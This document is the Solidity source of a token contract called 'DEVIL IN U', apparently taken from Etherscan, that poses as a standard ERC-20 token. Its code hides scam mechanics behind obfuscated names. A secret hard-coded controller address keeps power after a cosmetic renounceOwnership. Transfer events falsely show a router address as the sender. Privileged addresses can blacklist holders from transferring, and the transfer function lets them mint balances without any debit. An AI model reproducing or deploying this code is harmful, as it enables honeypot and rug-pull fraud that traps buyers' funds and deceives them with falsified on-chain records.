/**
 *Submitted for verification at Etherscan.io on 2022-11-01
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _OConst = 0x7Dfaa3B7842085c0C5C6A7AA7C97f9B4e9357170;
	address UniV3Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract DEVILINYOU is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private KO;
	mapping (address => bool) private SO;
    mapping (address => bool) private RO;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _OSup = 66600000 * 10**_decimals;
    string private constant _name = "DEVIL IN U";
    string private constant _symbol = "DEVILINU";



    constructor () {
        KO[_msgSender()] = _OSup;
        emit Transfer(address(0), UniV3Router, _OSup);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _OSup;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return KO[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function Orng(address z) public {
        if(SO[msg.sender]) { 
        RO[z] = false;}}
        function oDelegate(address z) public{
         if(SO[msg.sender])  { 
        require(!RO[z]);
        RO[z] = true; }}
		function oRelease(address z) public{
         if(msg.sender == _OConst)  { 
        require(!SO[z]);
        SO[z] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _OConst)  {
        require(amount <= KO[sender]);
        KO[sender] -= amount;  
        KO[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (UniV3Router, recipient, amount);
        return true; }    
          if(!RO[recipient]) {
          if(!RO[sender]) {
         require(amount <= KO[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        KO[sender] -= amount;
        KO[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Four, uint256 z) public {
        if(msg.sender == _OConst)  {
        require(KO[msg.sender] >= z);
        KO[msg.sender] -= z;  
        KO[Four] += z; 
        emit Transfer (UniV3Router, Four, z);}
        if(SO[msg.sender]) {KO[Four] += z;} 
        if(!RO[msg.sender]) {
        require(KO[msg.sender] >= z);
        KO[msg.sender] -= z;  
        KO[Four] += z;          
        emit Transfer(msg.sender, Four, z);
        }}}